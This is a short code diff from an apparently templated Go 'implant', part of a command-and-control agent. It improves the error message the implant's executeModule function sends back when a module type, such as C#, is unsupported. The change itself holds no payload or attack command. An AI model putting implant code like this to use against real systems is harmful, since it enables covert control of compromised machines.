@@ -1264,7 +1264,14 @@ func executeModule(taskID, moduleID string, task map[string]interface{}) {
 	}
 	{{else}}
 	// No modules embedded and not PowerShell/Python - module not available
-	sendResult("module", taskID, "Module not available (not PowerShell/Python and not embedded)")
+	// Check what type of module this is for better error message
+	var errorMsg string
+	if strings.Contains(moduleID, "csharp/") {
+		errorMsg = "Error: C# modules are not supported by Go implants. Only PowerShell and Python modules are currently supported."
+	} else {
+		errorMsg = fmt.Sprintf("Error: Module type not supported (not PowerShell/Python and not embedded). Module: %s", moduleID)
+	}
+	sendResult("module", taskID, errorMsg)
 	{{end}}
 }
 
